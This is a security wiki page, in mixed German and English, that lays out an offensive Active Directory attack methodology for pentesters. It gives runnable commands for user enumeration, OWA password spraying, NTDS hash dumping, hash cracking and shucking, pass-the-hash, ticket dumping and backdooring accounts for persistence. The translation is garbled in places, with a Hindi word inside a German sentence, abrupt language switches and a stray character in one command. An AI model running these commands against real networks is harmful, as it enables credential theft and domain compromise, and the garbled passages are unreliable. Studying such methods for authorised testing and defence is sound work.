# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** dient als grundlegende Technologie und ermöglicht es **network administrators**, **domains**, **users** und **objects** innerhalb eines Netzwerks effizient zu erstellen und zu verwalten. Sie ist für Skalierung ausgelegt und erleichtert die Organisation einer großen Anzahl von Benutzern in überschaubare **groups** und **subgroups**, während **access rights** auf verschiedenen Ebenen नियंत्रliert werden.

Die Struktur von **Active Directory** besteht aus drei primären Ebenen: **domains**, **trees** und **forests**. Eine **domain** umfasst eine Sammlung von Objekten, wie **users** oder **devices**, die eine gemeinsame Datenbank teilen. **Trees** sind Gruppen dieser Domains, die durch eine gemeinsame Struktur verbunden sind, und ein **forest** repräsentiert die Sammlung mehrerer Trees, die durch **trust relationships** miteinander verbunden sind und die oberste Ebene der Organisationsstruktur bilden. Spezifische **access**- und **communication rights** können auf jeder dieser Ebenen festgelegt werden.

Zu den Kernkonzepten in **Active Directory** gehören:

1. **Directory** – Beinhaltet alle Informationen zu Active Directory objects.
2. **Object** – Bezeichnet Entitäten innerhalb des directory, darunter **users**, **groups** oder **shared folders**.
3. **Domain** – Dient als Container für directory objects, wobei mehrere domains innerhalb eines **forest** koexistieren können und jede ihre eigene object collection verwaltet.
4. **Tree** – Eine Gruppierung von domains, die eine gemeinsame root domain teilen.
5. **Forest** – Der Höhepunkt der Organisationsstruktur in Active Directory, bestehend aus mehreren trees mit **trust relationships** untereinander.

**Active Directory Domain Services (AD DS)** umfasst eine Reihe von Diensten, die für die zentrale Verwaltung und Kommunikation innerhalb eines Netzwerks entscheidend sind. Zu diesen Diensten gehören:

1. **Domain Services** – Zentralisiert die Datenspeicherung und verwaltet Interaktionen zwischen **users** und **domains**, einschließlich **authentication** und **search**-Funktionen.
2. **Certificate Services** – Überwacht die Erstellung, Verteilung und Verwaltung sicherer **digital certificates**.
3. **Lightweight Directory Services** – Unterstützt directory-enabled applications über das **LDAP protocol**.
4. **Directory Federation Services** – Bietet **single-sign-on**-Funktionen zur Authentifizierung von Benutzern über mehrere web applications in einer einzigen Sitzung.
5. **Rights Management** – Hilft beim Schutz von urheberrechtlich geschütztem Material, indem die unautorisierte Verteilung und Nutzung geregelt wird.
6. **DNS Service** – Entscheidend für die Auflösung von **domain names**.

Für eine ausführlichere Erklärung siehe: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Um zu lernen, wie man einen **AD** angreift, musst du den **Kerberos authentication process** wirklich gut **understand**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Du kannst [https://wadcoms.github.io/](https://wadcoms.github.io) verwenden, um schnell zu sehen, welche commands du zur Aufklärung/Angriff auf einen AD ausführen kannst.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Wenn du nur Zugriff auf eine AD-Umgebung hast, aber keine credentials/sessions, könntest du:

- **Pentest the network:**
- Das Netzwerk scannen, Maschinen und offene ports finden und versuchen, **exploit vulnerabilities** auszunutzen oder **credentials** daraus zu extrahieren (zum Beispiel können [printers could be very interesting targets](ad-information-in-printers.md) sein).
- Die DNS-Auflösung kann Informationen über wichtige Server in der Domain liefern, wie web, printers, shares, vpn, media usw.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Wirf einen Blick auf die allgemeine [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md), um mehr darüber zu erfahren.
- **Check for null and Guest access on smb services** (das funktioniert auf modernen Windows-Versionen nicht):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Eine ausführlichere Anleitung zum Enumerieren eines SMB-Servers findest du hier:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Eine ausführlichere Anleitung zum Enumerieren von LDAP findest du hier (achte **besonders auf den anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Sammle credentials, indem du [**services with Responder impersonating**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) nachahmst
- Greife auf Hosts zu, indem du [**the relay attack abusing**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) missbrauchst
- Sammle credentials durch das **exposing** von [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extrahiere Benutzernamen/Namen aus internen Dokumenten, sozialen Medien und Diensten (hauptsächlich web) innerhalb der Domain-Umgebungen sowie aus öffentlich verfügbaren Quellen.
- Wenn du die vollständigen Namen von Firmenmitarbeitern findest, kannst du verschiedene AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)) ausprobieren. Die gängigsten Konventionen sind: _NameSurname_, _Name.Surname_, _NamSur_ (3 Buchstaben von jedem), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _zufällige Buchstaben und 3 zufällige Zahlen_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Siehe die Seiten [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) und [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Wenn ein **invalid username is requested**, antwortet der Server mit dem **Kerberos error**-Code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, wodurch wir erkennen können, dass der Benutzername ungültig war. **Valid usernames** lösen entweder die **TGT in a AS-REP**-Antwort oder den Fehler _KRB5KDC_ERR_PREAUTH_REQUIRED_ aus, was darauf hinweist, dass der Benutzer eine Pre-Authentication durchführen muss.
- **No Authentication against MS-NRPC**: Verwendung von auth-level = 1 (No authentication) gegen die MS-NRPC-(Netlogon)-Schnittstelle auf Domain Controllern. Die Methode ruft nach dem Binden an die MS-NRPC-Schnittstelle die Funktion `DsrGetDcNameEx2` auf, um ohne credentials zu prüfen, ob der Benutzer oder Computer existiert. Das Tool [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementiert diese Art der Enumeration. Die Forschung dazu findest du [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Wenn du einen dieser Server im Netzwerk gefunden hast, kannst du auch **User Enumeration gegen ihn** durchführen. Zum Beispiel kannst du das Tool [**MailSniper**](https://github.com/dafthack/MailSniper) verwenden:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Du findest Listen von Usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  und in diesem hier ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Allerdings solltest du den **Namen der Personen, die in der Company arbeiten**, aus dem Recon-Schritt haben, den du vor diesem Punkt bereits durchgeführt haben solltest. Mit Vor- und Nachname könntest du das Script [**namemash.py**](https://gist.github.com/superkojiman/11076951) verwenden, um potenziell gültige Usernames zu generieren.

### Knowing one or several usernames

Ok, du weißt also, dass du bereits einen gültigen Username hast, aber keine Passwörter... Dann versuche:

- [**ASREPRoast**](asreproast.md): Wenn ein User das Attribut _DONT_REQ_PREAUTH_ **nicht hat**, kannst du eine **AS_REP message anfordern** für diesen User, die einige durch eine Ableitung des Passworts des Users verschlüsselte Daten enthält.
- [**Password Spraying**](password-spraying.md): Versuchen wir die **häufigsten Passwörter** mit jedem der entdeckten User, vielleicht verwendet jemand ein schlechtes Passwort (denk an die Password Policy!).
- Beachte, dass du auch **OWA servers** sprühen kannst, um Zugriff auf die Mailserver der User zu bekommen.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Du könntest in der Lage sein, einige Challenge-**Hashes** zu **erhalten**, um einige Protokolle des **network** zu **poisoning**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Wenn du es geschafft hast, das active directory zu enumerieren, wirst du **mehr emails und ein besseres Verständnis des network** haben. Möglicherweise kannst du NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) erzwingen, um Zugriff auf die AD env zu bekommen.

### NetExec workspace-driven recon & relay posture checks

- Verwende **`nxcdb` workspaces**, um den AD-Recon-Status pro Engagement zu speichern: `workspace create <name>` erzeugt protokollspezifische SQLite-DBs unter `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Wechsle die Ansicht mit `proto smb|mssql|winrm` und liste gesammelte secrets mit `creds` auf. Lösche sensible Daten manuell, wenn du fertig bist: `rm -rf ~/.nxc/workspaces/<name>`.
- Schnelle Subnet-Erkennung mit **`netexec smb <cidr>`** zeigt **domain**, **OS build**, **SMB signing requirements** und **Null Auth**. Members mit `(signing:False)` sind **relay-prone**, während DCs oft Signing erfordern.
- Generiere **hostnames in /etc/hosts** direkt aus der NetExec-Ausgabe, um das Targeting zu erleichtern:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wenn **SMB relay zum DC blockiert** ist durch Signing, prüfe trotzdem die **LDAP**-Konfiguration: `netexec ldap <dc>` hebt `(signing:None)` / schwaches Channel Binding hervor. Ein DC mit erforderlichem SMB Signing, aber deaktiviertem LDAP Signing, bleibt ein brauchbares **relay-to-LDAP**-Ziel für Abuse wie **SPN-less RBCD**.

### Client-seitige Printer-Credential-Leaks → Bulk Domain Credential Validation

- Printer-/Web-UIs **betten manchmal maskierte Admin-Passwörter in HTML ein**. Im Source/devtools ansehen kann Klartext offenlegen (z. B. `<input value="<password>">`), was Basic-Auth-Zugriff auf Scan-/Print-Repositories ermöglicht.
- Abgerufene Printjobs können **plaintext Onboarding-Dokumente** mit per-user Passwörtern enthalten. Halte beim Testen die Zuordnungen konsistent:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Wenn du es geschafft hast, Active Directory zu enumerieren, wirst du **mehr E-Mails und ein besseres Verständnis des Netzwerks** haben. Du könntest NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.** erzwingen

### Looks for Creds in Computer Shares | SMB Shares

Jetzt, da du einige grundlegende Credentials hast, solltest du prüfen, ob du **irgendwelche interessanten Dateien finden** kannst, die innerhalb des AD geteilt werden. Du könntest das manuell tun, aber das ist eine sehr langweilige, repetitive Aufgabe (und noch mehr, wenn du Hunderte von Dokumenten findest, die du prüfen musst).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Wenn du auf andere PCs oder Shares **zugreifen** kannst, könntest du **Dateien ablegen** (wie eine SCF-Datei), die, wenn sie irgendwie geöffnet werden, eine **NTLM authentication gegen dich auslösen** würden, sodass du den **NTLM challenge** stehlen kannst, um ihn zu cracken:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Diese Schwachstelle erlaubte jedem authentifizierten Benutzer, den **domain controller zu kompromittieren**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Für die folgenden Techniken reicht ein normaler Domain-Benutzer nicht aus, du brauchst einige spezielle Privilegien/Credentials, um diese Angriffe durchzuführen.**

### Hash extraction

Hoffentlich ist es dir gelungen, einen **lokalen Admin**-Account mit [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) einschließlich Relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [lokaler Privilegieneskalation](../windows-local-privilege-escalation/index.html) zu **kompromittieren**.\
Dann ist es Zeit, alle Hashes im Speicher und lokal zu dumpen.\
[**Lies diese Seite über verschiedene Wege, die Hashes zu erhalten.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sobald du den Hash eines Benutzers hast**, kannst du ihn verwenden, um ihn zu **imponieren**.\
Du musst ein **Tool** verwenden, das die **NTLM authentication unter Verwendung** dieses **Hashs** **durchführt**, **oder** du kannst einen neuen **sessionlogon** erstellen und diesen **Hash** in die **LSASS** **injizieren**, sodass bei jeder **NTLM authentication** dieser **Hash** verwendet wird. Die letzte Option ist das, was mimikatz macht.\
[**Lies diese Seite für mehr Informationen.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Dieser Angriff zielt darauf ab, den **NTLM-Hash des Benutzers zu verwenden, um Kerberos-Tickets anzufordern**, als Alternative zum üblichen Pass The Hash über das NTLM-Protokoll. Daher kann dies besonders **nützlich in Netzwerken sein, in denen das NTLM-Protokoll deaktiviert ist** und nur **Kerberos als Authentifizierungsprotokoll erlaubt** ist.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Bei der Angriffsmethode **Pass The Ticket (PTT)** stehlen Angreifer **das Authentifizierungsticket eines Benutzers** statt dessen Passwort oder Hash-Werten. Dieses gestohlene Ticket wird dann verwendet, um **den Benutzer zu impersonieren** und unautorisierten Zugriff auf Ressourcen und Dienste innerhalb eines Netzwerks zu erhalten.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Wenn du den **Hash** oder das **Passwort** eines **lokalen Administrators** hast, solltest du versuchen, dich damit **lokal** bei anderen **PCs** anzumelden.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Beachte, dass dies ziemlich **laut** ist und **LAPS** dies **mindern** würde.

### MSSQL Abuse & Trusted Links

Wenn ein Benutzer Berechtigungen hat, auf **MSSQL-Instanzen zuzugreifen**, könnte er diese nutzen, um **Befehle auszuführen** auf dem MSSQL-Host (falls als SA ausgeführt), den NetNTLM-**Hash zu stehlen** oder sogar einen **Relay**-**Angriff** durchzuführen.\
Außerdem, wenn eine MSSQL-Instanz von einer anderen MSSQL-Instanz vertraut wird (database link). Wenn der Benutzer über die vertrauenswürdige Datenbank Rechte hat, kann er die Vertrauensbeziehung nutzen, um auch in der anderen Instanz Abfragen auszuführen. Diese Trusts können verkettet werden, und irgendwann könnte der Benutzer eine falsch konfigurierte Datenbank finden, auf der er Befehle ausführen kann.\
**Die Links zwischen Datenbanken funktionieren sogar über Forest Trusts hinweg.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Drittanbieter-Inventory- und Deployment-Suites bieten oft mächtige Wege zu Credentials und Code Execution. Siehe:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Wenn du ein Computer-Objekt mit dem Attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) findest und du Domain-Rechte auf dem Computer hast, kannst du TGTs aus dem Speicher aller Benutzer dumpen, die sich an diesem Computer anmelden.\
Wenn sich also ein **Domain Admin am Computer anmeldet**, kannst du seinen TGT dumpen und ihn mit [Pass the Ticket](pass-the-ticket.md) impersonieren.\
Dank constrained delegation könntest du sogar **automatisch einen Print Server kompromittieren** (hoffentlich ist es ein DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Wenn ein Benutzer oder Computer für "Constrained Delegation" erlaubt ist, kann er **jeden Benutzer impersonieren, um auf bestimmte Dienste auf einem Computer zuzugreifen**.\
Wenn du dann den **Hash** dieses Benutzers/Computers **kompromittierst**, kannst du **jeden Benutzer** (sogar Domain Admins) impersonieren, um auf bestimmte Dienste zuzugreifen.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Wenn man auf einem Active-Directory-Objekt eines entfernten Computers das **WRITE**-Recht hat, ermöglicht das die Ausführung von Code mit **erhöhten Rechten**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Der kompromittierte Benutzer könnte über einige **interessante Rechte auf bestimmte Domain-Objekte** verfügen, die es dir erlauben könnten, seitlich zu **pivotieren**/**Rechte zu eskalieren**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Das Entdecken eines **laufenden Spool-Dienstes** innerhalb der Domain kann **ausgenutzt** werden, um **neue Credentials zu erlangen** und **Rechte zu eskalieren**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Wenn **andere Benutzer** auf die **kompromittierte** Maschine **zugreifen**, ist es möglich, **Credentials aus dem Speicher zu sammeln** und sogar **Beacons in ihre Prozesse zu injizieren**, um sie zu impersonieren.\
Normalerweise greifen Benutzer per RDP auf das System zu, daher findest du hier, wie man einige Angriffe auf fremde RDP-Sessions durchführt:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** bietet ein System zur Verwaltung des **lokalen Administratorpassworts** auf domänenverbundenen Computern und stellt sicher, dass es **randomisiert**, eindeutig und häufig **geändert** wird. Diese Passwörter werden in Active Directory gespeichert, und der Zugriff wird über ACLs nur autorisierten Benutzern gewährt. Mit ausreichenden Berechtigungen, um auf diese Passwörter zuzugreifen, wird ein Pivoting auf andere Computer möglich.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Das **Sammeln von Zertifikaten** von der kompromittierten Maschine könnte ein Weg sein, um innerhalb der Umgebung Rechte zu eskalieren:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Wenn **anfällige Templates** konfiguriert sind, ist es möglich, sie auszunutzen, um Rechte zu eskalieren:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Sobald du **Domain Admin**- oder sogar noch besser **Enterprise Admin**-Rechte hast, kannst du die **Domain-Datenbank** dumpen: _ntds.dit_.

[**Mehr Informationen über den DCSync-Angriff findest du hier**](dcsync.md).

[**Mehr Informationen darüber, wie man die NTDS.dit stiehlt, findest du hier**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Einige der zuvor besprochenen Techniken können für Persistence verwendet werden.\
Zum Beispiel könntest du:

- Benutzer anfällig für [**Kerberoast**](kerberoast.md) machen

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Benutzer anfällig für [**ASREPRoast**](asreproast.md) machen

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

